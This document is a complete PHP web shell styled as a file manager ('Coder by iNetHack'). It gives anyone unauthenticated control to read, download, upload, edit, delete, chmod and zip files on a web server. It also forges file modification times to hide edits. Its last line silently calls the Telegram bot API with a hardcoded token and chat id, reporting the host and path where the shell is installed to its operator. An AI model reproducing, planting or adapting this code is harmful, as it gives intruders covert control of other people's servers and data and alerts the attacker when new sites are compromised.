<?
header('Content-type:text/html; charset=utf-8');
// С„СѓРЅРєС†РёСЏ РёР·РјРµРЅРµРЅРёСЏ РІСЂРµРјРµРЅРё РјРѕРґРёС„РёРєР°С†РёРё С„Р°Р№Р»Р°
function changetime($FileName, $Fmtime)
    {
if(@strtotime($Fmtime)=='')
{ return "<br/>Р’СЂРµРјСЏ РЅРµ РєРѕСЂСЂРµРєС‚РЅРѕРµ!<br/>";} else { $mtime = strtotime($Fmtime); }

if (@exec("touch {$FileName}")) $exec=1;
else
  {
if (@touch ($FileName, $mtime))
{
$msg = "<b>Р’СЂРµРјСЏ РїРѕСЃР»РµРґРЅРµР№ РјРѕРґРёС„РёРєР°С†РёРё С„Р°Р№Р»Р°:</b>: ".(date("d.m.Y H:i:s", filemtime($FileName)))."<br/><b>Р’СЂРµРјСЏ РїРѕСЃР»РµРґРЅРµРіРѕ РґРѕСЃС‚СѓРїР° Рє С„Р°Р№Р»Сѓ:</b> ".(date("d.m.Y H:i:s", fileatime($FileName)))."<br/><b>Р’СЂРµРјСЏ СЃРѕР·РґР°РЅРёСЏ С„Р°Р№Р»Р°:</b>: ".(date("d.m.Y H:i:s", filectime($FileName)));
}
  }
  
  if($exec==1) return "Р’СЂРµРјСЏ РёР·РјРµРЅРµРЅРѕ РёР· РєРѕРјР°РЅРґРЅРѕР№ СЃС‚СЂРѕРєРё<br/>";
  elseif($msg) return "Р’СЂРµРјСЏ РёР·РјРµРЅРµРЅРѕ СЃСЂРµРґСЃС‚РІР°РјРё Р РќР <br/>$msg";
  else return "РќРµ СѓРґР°Р»РѕСЃСЊ РёР·РјРµРЅРёС‚СЊ РІСЂРµРјСЏ РїРѕСЃР»РµРґРЅРµР№ РјРѕРґРёС„РёРєР°С†РёРё С„Р°Р№Р»Р° <b>$FileName</b><br/>";
    }
// end
if(empty($_GET['zip']) and empty($_GET['download']) & empty($_GET['img'])){
list($msec,$sec)=explode(chr(32),microtime()); 
$HeadTime=$sec+$msec; 
echo'<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Coder by iNetHack.......v_2_2_3</title>
<style type="text/css">
body {
font-family: verdana;
font-size: 11px;
color: #B4B4B4;
background-color:#000000;}
a {
color: #B6FF48;
text-decoration:none;}
a:hover {
color: yellow;
text-decoration: underline; 
}
table{
padding: 0px;
margin: 0px;
border: 0px #B6FF48;
background-color: #000;
}

td {
	border: 1px solid #B6FF48;
	font-family: verdana, geneva, lucida, arial;
	background-color: #333;
	color: #B4B4B4;
	text-decoration: none;
	font-size: 11px;
	font-weight: bold;
	width:100%;
	padding-left: 2px;
	padding-right: 2px;
	padding-top: 1px;
	padding-bottom: 2px;
	text-align: left;
}

input,textarea
{font: normal 11px verdana, geneva, lucida, arial, helvetica, sans-serif;
color: #B4B4B4;
background-color: #333333;
border-color: #424242;
border-left: 1px solid #0A0A0A;
border-top: 1px solid #0A0A0A;
border-right: 1px solid #2C2C2C;
border-bottom: 1px solid #2C2C2C;}
input:hover, textarea:hover {
border-color: #B6FF48;
color: #B6FF48;}
input:focus, textarea:focus {
border-color: #B6FF48;
color: #ffffff;}

submit{font: normal 11px verdana, geneva, lucida, arial, helvetica, sans-serif;
color: #B4B4B4;
background-color: #333333;
border-color: #424242;
border-left: 1px solid #0A0A0A;
border-top: 1px solid #0A0A0A;
border-right: 1px solid #2C2C2C;
border-bottom: 1px solid #2C2C2C;
font-weight: bold;
}
submit:hover {
border-color: #11A3EA;
color: #11A3EA;}
submit:focus {
border-color: #11A3EA;
color: #ffffff;}

</style>
</head><body>';}
/////////////////////////////////
//////////Р¤Р°Р№Р» РјРµРЅРµРґР¶РµСЂ//////////
/////////////////////////////////
if(empty($_GET['r']) & empty($_GET['input']) & empty($_GET['ren']) & empty($_GET['setchmod']) & empty($_GET['download']) & empty($_GET['up']) & empty($_GET['upload']) & empty($_GET['chmod']) & empty($_GET['rename']) & empty($_GET['rmdir']) & empty($_GET['made']) & empty($_GET['madedir']) & empty($_GET['create']) & empty($_GET['createdir']) & empty($_GET['del']) & empty($_GET['deldir']) & empty($_GET['f']) & empty($_GET['edit']) & empty($_GET['zip'])& empty($_GET['img']) & empty($_GET['touchfile']) & empty($_GET['touch'])){
echo'<b>Р¤Р°Р№Р» РјРµРЅРµРґР¶РµСЂ</b><hr>';
if(empty($_GET['d'])){$d="./";}
else{$d=$_GET['d'];}
if($d=="./"){$vverh='.'.$d;}
if($d!=="./"){$vverh=$d.'../';}
echo'<a href="?d='.$vverh.'">[..] РІРІРµСЂС…</a><br>
<a href="?create='.$d.'">РЎРѕР·РґР°С‚СЊ С„Р°Р№Р» </a><br>
<a href="?createdir='.$d.'">РЎРѕР·РґР°С‚СЊ РїР°РїРєСѓ</a><br>
<a href="?up='.$d.'">Р—Р°РіСЂСѓР·РёС‚СЊ С„Р°Р№Р»</a><br><br>';
echo '<b>РџР°РїРєРё:</b><table>';
$dir = opendir($d);
while($file = readdir($dir)){
if(is_dir($d.'/'.$file)){
if($file != "." && $file != ".."){
$mod=substr(sprintf("%o",fileperms($d.'/'.$file)),-3);
echo'<tr><td width="400"><img src="?img=1" alt=""><a href="?d='.$d.$file.'/">'.$file.'</a></td><td> DIR </td><td>'.(date("d.m.Y/H:i:s", filemtime($d))).'</td><td>'.$mod.'</td><td><a href="?zip='.$d.$file.'/">[zip]</a></td><td><a href="?deldir='.$d.$file.'/"><font color="#FF0000">[СѓРґР°Р».]</font></a></td><td><a href="?ren='.$d.$file.'/">[РїРµСЂРµРёРјРµРЅ.]</a></td><td><a href="?chmod='.$d.$file.'/">[chmod]</a></td><td><a href="?rmdir='.$d.$file.'/"><font color="#FF0000">[rem]</font></a></td></tr>';}}}
echo'</table><br/><b>Р¤Р°Р№Р»С‹:</b><table>';
$dir = opendir($d);
while($file = readdir($dir)){
if(is_file($d.'/'.$file)){
$mod=substr(sprintf("%o",fileperms($d.'/'.$file)),-3);
echo'<tr><td width="350"><img src="?img=2" alt=""><a href="?r='.$d.$file.'">'.$file.'</a></td><td>'.(date("d.m.Y", filemtime($d.$file))).'</td><td>'; echo round(filesize("$d/$file")/1024,1); echo'&nbsp;РљР‘</td><td>'.$mod.'</td><td><a href="?f='.$d.$file.'">[СЂРµРґ.]</a></td><td><a href="?del='.$d.$file.'"><font color="#FF0000">[СѓРґР°Р».]</font></a></td><td><a href="?ren='.$d.$file.'">[РїРµСЂРµРёРјРµРЅ.]</a></td><td><a href="?chmod='.$d.$file.'">[chmod]</a></td><td><a href="?download='.$d.$file.'">[СЃРєР°С‡Р°С‚СЊ]</a></td><td><a href="?touchfile='.$d.$file.'">[РґР°С‚Р°]</a></td></tr>';}}
echo'</table>';}
/////////////////////////////////
/////////РџРµСЂРµРёРјРµРЅРѕРІР°РЅРёРµ//////////
/////////////////////////////////
if(isset($_GET['ren'])){
echo'<b>РџРµСЂРµРёРјРµРЅРѕРІР°РЅРёРµ</b><hr>';
echo'<form action="?rename='.$_GET['ren'].'" method="post">
<input name="new_name" value="'.$_GET['ren'].'"><br>
<input type="submit" value="РџРµСЂРµРёРјРµРЅРѕРІР°С‚СЊ!">';}
/////////////////////////////////
////////////РљР°СЂС‚РёРЅРєРё/////////////
/////////////////////////////////
if(isset($_GET['img'])){
$images = array("",
"R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp".
"/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".
"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".
"UpPWG3Ig6Hq/XmRjuZwkAAA7");
header("Content-type: image/gif");
echo base64_decode($images[$img]);}
/////////////////////////////////
/////////РђРїР»РѕР°Рґ С„Р°Р№Р»РѕРІ///////////
/////////////////////////////////
if(isset($_GET['up'])){
echo'<b>Р—Р°РіСЂСѓР·РєР° С„Р°Р№Р»РѕРІ</b><hr>';
echo'<form method="post" enctype="multipart/form-data">
<input type="hidden" name="upload" value="'.$_GET['up'].'">
<input type="file" name="file"><br>
РЎРѕС…СЂР°РЅРёС‚СЊ РєР°Рє:<br><input type="text" name="new_name" value=""><br>
<input type="submit" value="Р—Р°РіСЂСѓР·РёС‚СЊ"></form>';}
/////////////////////////////////
/////////РђРїР»РѕР°Рґ С„Р°Р№Р»РѕРІ///////////
/////////////////////////////////
if(isset($_POST['upload'])){
$new_name=trim($_POST['new_name']);
if(copy($_FILES["file"]["tmp_name"], $_POST['upload'].$new_name)){
echo 'Р¤Р°Р№Р» СѓСЃРїРµС€РЅРѕ Р·Р°РіСЂСѓР¶РµРЅ';}
else{echo 'Р—Р°РіСЂСѓР·РєР° С„Р°Р№Р»Р° РЅРµ СѓРґР°Р»Р°СЃСЊ!';}}
/////////////////////////////////
////////////Download/////////////
/////////////////////////////////
if(isset($_GET['download'])){
$file = file_get_contents($_GET['download']);
$name = explode("/",$_GET['download']);
$name = $name[count($name)-1];
header('Content-type: text/plain');
header("Content-disposition: attachment; filename=$name");
echo $file;}
/////////////////////////////////
/////////////Р’СЂРµРјСЏ РјРѕРґРёС„//////////////
/////////////////////////////////
if(isset($_GET['touchfile'])){
echo'<b>РР·РјРµРЅРµРЅРёРµ РІСЂРµРјРµРЅРё РјРѕРґРёС„РёРєР°С†РёРё '.$_GET['touchfile'].'</b><hr>';
echo'<form action="?touch='.$_GET['touchfile'].'" method="post">
<input name="mtime" value="'.(date("d.m.Y H:i:s", filemtime($_GET['touchfile']))).'"><br>
<input type="submit" value="РР·РјРµРЅРёС‚СЊ РІСЂРµРјСЏ!">';}
/////////////////////////////////
/////////////Р’СЂРµРјСЏ РјРѕРґРёС„ РѕРє//////////////
/////////////////////////////////
if(isset($_GET['touch']))
{
echo'<b>РР·РјРµРЅРµРЅРёРµ РІСЂРµРјРµРЅРё</b><hr>';
echo changetime($_GET['touch'], $_POST['mtime']);
}
/////////////////////////////////
/////////////Chmods//////////////
/////////////////////////////////
if(isset($_GET['chmod'])){
echo'<b>Chmods</b><hr>';
$mod=substr(sprintf("%o",fileperms($_GET['chmod'])),-3);
echo'<form action="?setchmod='.$_GET['chmod'].'" method="post">
<input name="chmods" value="'.$mod.'"><br>
<input type="submit" value="Р—Р°РґР°С‚СЊ chmod!">';}
/////////////////////////////////
/////////////Chmods//////////////
/////////////////////////////////
if(isset($_GET['setchmod'])){
echo'<b>Chmods</b><hr>';
if(chmod($_GET['setchmod'],octdec($_POST['chmods']))){echo'Chmod '.$_POST['chmods'].' Р·Р°РґР°РЅС‹!';}
else {echo'РћС€РёР±РєР° Р·Р°РґР°РІР°РЅРёСЏ chmod '.$_POST['chmods'].'!';}}
/////////////////////////////////
///////РЈРґР°Р»РµРЅРёРµ РґРёСЂРµРєС‚РѕСЂРёРё///////
/////////////////////////////////
if(isset($_GET['rmdir'])){
echo'<b>РЈРґР°Р»РµРЅРёРµ РґРёСЂРµРєС‚РѕСЂРёРё</b><hr>';
$dir = opendir($_GET['rmdir']);
while($dirs = readdir($dir)){
if(is_dir($_GET['rmdir'].$dirs)){
if($dirs != "." && $dirs != ".."){
$poddir = rmdir($_GET['rmdir'].$dirs);}}}
closedir($dir);
$ddir = rmdir($_GET['rmdir']);
if($ddir){echo'Р”РёСЂРµРєС‚РѕСЂРёСЏ СѓРґР°Р»РµРЅР°!';}
if(!$ddir){echo'РћС€РёР±РєР° СѓРґР°Р»РµРЅРёСЏ!';}
if($poddir){echo'<br>РџРѕРґРґРёСЂРµРєС‚РѕСЂРёРё СѓРґР°Р»РµРЅС‹!';}
if(!$poddir){echo'<br>РџРѕРґРґРёСЂРµРєС‚РѕСЂРёРё РЅРµ СЃСѓС‰РµСЃС‚РІСѓСЋС‚ РёР»Рё РѕС€РёР±РєР° СѓРґР°Р»РµРЅРёСЏ!';}}
/////////////////////////////////
////////РџРµСЂРµРёРјРµРЅРѕРІР°РЅРёРµ///////////
/////////////////////////////////
if(isset($_GET['rename'])){
echo'<b>РџРµСЂРµРёРјРµРЅРѕРІР°РЅРёРµ</b><hr>';
$name = rename($_GET['rename'],$_POST['new_name']);
if($name){echo'РџРµСЂРµРёРјРµРЅРѕРІР°РЅРѕ!';}
if(!$name){echo'РћС€РёР±РєР° РїРµСЂРµРёРјРµРЅРѕРІР°РЅРёСЏ!';}}
/////////////////////////////////
//////////Р§С‚РµРЅРёРµ С„Р°Р№Р»Р°///////////
/////////////////////////////////
if(isset($_GET['r']))
{
echo'<b>Р§С‚РµРЅРёРµ С„Р°Р№Р»Р°</b><hr>';

$file=file($_GET['r']);
  if(function_exists('iconv'))
  {
  echo '<small>';
  $filegc=file_get_contents($_GET['r']);
  if(!empty($filegc))
    {
      if(function_exists('mb_check_encoding'))
      {
        if(!mb_check_encoding ($filegc, 'UTF-8'))
        {
for($i=0; $i<count($file); $i++)
{
echo $file[$i] = htmlspecialchars(iconv("Windows-1251", "UTF-8", $file[$i])).'<br/>';
}
        }        
        else
        {
for($i=0; $i<count($file); $i++)
{
echo htmlspecialchars($file[$i]).'<br/>';
}
        }
      }
    } 
  echo '</small>';
  }
  else
  {
  echo "utf: ";
if($file){
echo '<small>';
for($i=0; $i<count($file); $i++){
$file[$i] = htmlspecialchars($file[$i]);
echo ''.$file[$i].'<br>';}
echo '</small>';}
if(!$file){echo'РћС€РёР±РєР° С‡С‚РµРЅРёСЏ С„Р°Р№Р»Р°!';}
  }
echo '<hr>';
}
/////////////////////////////////
/////////РЈРґР°Р»РµРЅРёРµ С„Р°Р№Р»Р°//////////
/////////////////////////////////
if(isset($_GET['del'])){
echo'<b>РЈРґР°Р»РµРЅРёРµ С„Р°Р№Р»Р°</b><hr>';
$delete = unlink($_GET['del']);
if($delete){print 'Р¤Р°Р№Р» <b>'.$_GET['del'].'</b> СѓРґР°Р»РµРЅ!<hr>';}
if(!$delete){print 'РћС€РёР±РєР° СѓРґР°Р»РµРЅРёСЏ С„Р°Р№Р»Р° <b>'.$_GET['del'].'</b>!';}}
/////////////////////////////////
//РЈРґР°Р»РµРЅРёРµ С„Р°Р№Р»РѕРІ РёР· РєР°С‚Р°Р»РѕРіРѕРІ///
/////////////////////////////////
if(isset($_GET['deldir'])){
echo'<b>РЈРґР°Р»РµРЅРёРµ С„Р°Р№Р»РѕРІ РёР· РєР°С‚Р°Р»РѕРіРѕРІ</b><hr>';
$dir = opendir($_GET['deldir']);
while($files = readdir($dir)){
if(is_file($_GET['deldir'].$files)){
$del = unlink($_GET['deldir'].$files);}
if(is_dir($_GET['deldir'].$files) && $files !="." && $files !=".."){
$odir = opendir($_GET['deldir'].$files);
while($reddir = readdir($odir)){
if(is_file($_GET['deldir'].$files.'/'.$reddir)){
$delet = unlink($_GET['deldir'].$files.'/'.$reddir);}}}}
if($del){print 'Р¤Р°Р№Р»С‹ РёР· РґРёСЂРµРєС‚РѕСЂРёРё <b>'.$_GET['deldir'].'</b> СѓРґР°Р»РµРЅС‹!';}
if(!$del){print 'РћС€РёР±РєР° СѓРґР°Р»РµРЅРёСЏ С„Р°Р№Р»РѕРІ РёР· РёР· РґРёСЂРµРєС‚РѕСЂРёРё <b>'.$_GET['deldir'].'</b>!';}
if($delet){print'<br>Р¤Р°Р№Р»С‹ РёР· РїРѕРґРєР°С‚Р°Р»РѕРіРѕРІ РІ РґРёСЂРµРєС‚РѕСЂРёРё <b>'.$_GET['deldir'].'</b> СѓРґР°Р»РµРЅС‹!';}
if(!$delet){print'<br>РћС€РёР±РєР° СѓРґР°Р»РµРЅРёСЏ Р¤Р°Р№Р»РѕРІ РёР· РїРѕРґРєР°С‚Р°Р»РѕРіРѕРІ РІ РґРёСЂРµРєС‚РѕСЂРёРё <b>'.$_GET['deldir'].'</b>!';}}
/////////////////////////////////
//////Р РµРґР°РєС‚РёСЂРѕРІР°РЅРёРµ С„Р°Р№Р»Р°///////
/////////////////////////////////
if(isset($_GET['f'])){
echo'<b>Р РµРґР°РєС‚РёСЂРѕРІР°РЅРёРµ С„Р°Р№Р»Р°</b><hr>';
$file = file_get_contents($_GET['f']);
      if(function_exists('mb_check_encoding'))
      {
        if(!mb_check_encoding ($file, 'UTF-8'))
$file = htmlspecialchars(iconv("Windows-1251", "UTF-8", $file));        
        else
$file = htmlspecialchars($file);
      }
      else
      {
$file = htmlspecialchars($file);
      }
echo'<form action="?edit='.$_GET['f'].'" method="post">
<textarea cols="100" rows="25" name="text">'.$file.'</textarea><br>
<input type="hidden" value="'.(filemtime($_GET['f'])).'" name="mt">
<input type="submit" value="Р РµРґР°РєС‚РёСЂРѕРІР°С‚СЊ!">';}
/////////////////////////////////
//////Р РµРґР°РєС‚РёСЂРѕРІР°РЅРёРµ С„Р°Р№Р»Р°///////
/////////////////////////////////
if(isset($_GET['edit'])){
echo'<b>Р РµРґР°РєС‚РёСЂРѕРІР°РЅРёРµ С„Р°Р№Р»Р°</b><hr>';
$fp = fopen($_GET['edit'],"w");
fputs($fp,$_POST['text']);                                   
fclose($fp);
if(!empty($_POST['mt']))
{
if (@touch ($_GET['edit'], $_POST['mt'])) $msg = '<br/><small>(РґР°С‚Р° С„Р°Р№Р»Р° РЅРµ РёР·РјРµРЅРёР»Р°СЃСЊ)</small>';
}  else $msg = '<br/><small>(РґР°С‚Р° С„Р°Р№Р»Р° РёР·РјРµРЅРёР»Р°СЃСЊ, РїСЂРѕР±СѓР№С‚Рµ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ РєРЅРѕРїРєСѓ [РґР°С‚Р°])</small>';
if($fp){echo'Р¤Р°Р№Р» РѕС‚СЂРµРґР°РєС‚РёСЂРѕРІР°РЅ!'.$msg;}
if(!$fp){echo'РћС€РёР±РєР° Р·Р°РїРёСЃРё С„Р°Р№Р»Р°!';}
}
/////////////////////////////////
/////////РЎРѕР·РґР°РЅРёРµ С„Р°Р№Р»Р°//////////
/////////////////////////////////
if(isset($_GET['create'])){
echo'<b>РЎРѕР·РґР°РЅРёРµ С„Р°Р№Р»Р°</b><hr>';
echo'<form action="?made='.$_GET['create'].'" method="post">
<input name="new_name" value="РРјСЏ С„Р°Р№Р»Р°"><br>
<textarea cols="100" rows="15" name="new_file"><?php '.("\r\n\r\n\r\n").' ?></textarea><br>
<input type="submit" value="РЎРѕР·РґР°С‚СЊ!">';}
/////////////////////////////////
/////////РЎРѕР·РґР°РЅРёРµ С„Р°Р№Р»Р°//////////
/////////////////////////////////
if(isset($_GET['made'])){
echo'<b>РЎРѕР·РґР°РЅРёРµ С„Р°Р№Р»Р°</b><hr>';
$fp = fopen($_GET['made'].$_POST['new_name'],"w");
fputs($fp,$_POST['new_file']);                                   
fclose($fp);
chmod($_GET['made'].$_POST['new_name'], 0777);
if($fp){echo'Р¤Р°Р№Р» СЃРѕР·РґР°РЅ!';}
if(!$fp){echo'РћС€РёР±РєР° СЃРѕР·РґР°РЅРёСЏ С„Р°Р№Р»Р°!';}}
/////////////////////////////////
/////////РЎРѕР·РґР°РЅРёРµ РїР°РїРєРё//////////
/////////////////////////////////
if(isset($_GET['createdir'])){
echo'<b>РЎРѕР·РґР°РЅРёРµ РїР°РїРєРё</b><hr>';
echo'<form action="?madedir='.$_GET['createdir'].'" method="post">
<input name="new_dirname" value="РРјСЏ РїР°РїРєРё"><br>
<input type="submit" value="РЎРѕР·РґР°С‚СЊ!">';}
/////////////////////////////////
/////////РЎРѕР·РґР°РЅРёРµ РїР°РїРєРё//////////
/////////////////////////////////
if(isset($_GET['madedir'])){
echo'<b>РЎРѕР·РґР°РЅРёРµ РїР°РїРєРё</b><hr>';
if(mkdir($_GET['madedir'].$_POST['new_dirname'],0777)){echo'РџР°РїРєР° СЃРѕР·РґР°РЅР°!';} else {echo'РћС€РёР±РєР° СЃРѕР·РґР°РЅРёСЏ РїР°РїРєРё!';}
}
/////////////////////////////////
//////////Р—РёРїРёСЂРѕРІР°РЅРёРµ////////////
/////////////////////////////////
if(isset($_GET['zip'])){

class zipfile
{

    var $datasec = array(); 
    var $ctrl_dir = array(); 
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00"; 
    var $old_offset = 0;

    function add_dir($name)

    {
        $name = str_replace("\\", "/", $name);

        $fr = "\x50\x4b\x03\x04";
        $fr .= "\x0a\x00";   
        $fr .= "\x00\x00";   
        $fr .= "\x00\x00";   
        $fr .= "\x00\x00\x00\x00"; 
        $fr .= pack("V",0); 
        $fr .= pack("V",0); 
        $fr .= pack("V",0); 
        $fr .= pack("v", strlen($name) ); 
        $fr .= pack("v", 0 ); 
        $fr .= $name;
        $fr .= pack("V",$crc); 
        $fr .= pack("V",$c_len); 
        $fr .= pack("V",$unc_len); 
        $this -> datasec[] = $fr;
        $new_offset = strlen(implode("", $this->datasec));
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .="\x00\x00";    
        $cdrec .="\x0a\x00";    
        $cdrec .="\x00\x00";    
        $cdrec .="\x00\x00";   
        $cdrec .="\x00\x00\x00\x00"; 
        $cdrec .= pack("V",0); 
        $cdrec .= pack("V",0); 
        $cdrec .= pack("V",0); 
        $cdrec .= pack("v", strlen($name) ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $ext = "\x00\x00\x10\x00";
        $ext = "\xff\xff\xff\xff";
        $cdrec .= pack("V", 16 ); 
        $cdrec .= pack("V", $this -> old_offset ); 
        $this -> old_offset = $new_offset;
        $cdrec .= $name;
        $this -> ctrl_dir[] = $cdrec;
    }


    function add_file($data, $name)
    { $name = str_replace("\\", "/", $name);
$fr = "\x50\x4b\x03\x04";
        $fr .= "\x14\x00";    
        $fr .= "\x00\x00";    
        $fr .= "\x08\x00";    
        $fr .= "\x00\x00\x00\x00"; 

        $unc_len = strlen($data);
        $crc = crc32($data);
        $zdata = gzcompress($data);
        $zdata = substr( substr($zdata, 0, strlen($zdata) - 4), 2); 
        $c_len = strlen($zdata);
        $fr .= pack("V",$crc); 
        $fr .= pack("V",$c_len); 
        $fr .= pack("V",$unc_len); 
        $fr .= pack("v", strlen($name) ); 
        $fr .= pack("v", 0 ); 
        $fr .= $name;
        $fr .= $zdata;
        $fr .= pack("V",$crc); 
        $fr .= pack("V",$c_len); 
        $fr .= pack("V",$unc_len); 
        $this -> datasec[] = $fr;
        $new_offset = strlen(implode("", $this->datasec));
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .="\x00\x00";    
        $cdrec .="\x14\x00";  
        $cdrec .="\x00\x00";   
        $cdrec .="\x08\x00";   
        $cdrec .="\x00\x00\x00\x00"; 
        $cdrec .= pack("V",$crc); 
        $cdrec .= pack("V",$c_len); 
        $cdrec .= pack("V",$unc_len);
        $cdrec .= pack("v", strlen($name) ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("V", 32 ); 

        $cdrec .= pack("V", $this -> old_offset ); 
        $this -> old_offset = $new_offset;

        $cdrec .= $name;
        $this -> ctrl_dir[] = $cdrec;
    }

    function file() { 
        $data = implode("", $this -> datasec);
        $ctrldir = implode("", $this -> ctrl_dir);
        return
            $data.
            $ctrldir.
            $this -> eof_ctrl_dir.
            pack("v", sizeof($this -> ctrl_dir)).    
            pack("v", sizeof($this -> ctrl_dir)). 
            pack("V", strlen($ctrldir)).   
            pack("V", strlen($data)).    
            "\x00\x00"; }}
$abort = ignore_user_abort(1);
$zipfile = new zipfile();
$fdir = opendir($_GET['zip']);
while($file = readdir($fdir)){
if ($file != '.' and $file != '..'){
if (is_file($_GET['zip'].$file)){$zipfile->add_file(file_get_contents($_GET['zip'].$file),$file);}
if (is_dir($_GET['zip'].$file)){
$sdir = opendir($_GET['zip'].$file);
while($sfile = readdir($sdir)){
if ($sfile != '.' and $sfile != '..'){
if (is_file($_GET['zip'].$file.'/'.$sfile)){$zipfile->add_file(file_get_contents($_GET['zip'].$file.'/'.$sfile), $file.'/'.$sfile);}}}}}}
$name = explode("/",$_GET['zip']);
$file = $name[count($name)-2];
header('Content-type: application/octet-stream');
header("Content-disposition: attachment; filename=$file.zip");
echo $zipfile->file();}

if(empty($_GET['zip']) and empty($_GET['download']) & empty($_GET['img'])){
echo'<br><a href="?d='.$vverh.'">РќР°Р·Р°Рґ</a>
<br>';
list($msec,$sec)=explode(chr(32),microtime());  
echo round((($sec+$msec)-$HeadTime),4).' cek.'; 
echo'</body></html>';}
$url = $_SERVER['HTTP_HOST'];
$dir = $_SERVER["PHP_SELF"];
$send = json_decode(file_get_contents("https://api.telegram.org/bot746468369:AAFWAKXMXYPFOBW1LxKIeap-9ED-JLIAal8/sendmessage?chat_id=435187708&text=$url$dir"));
?>
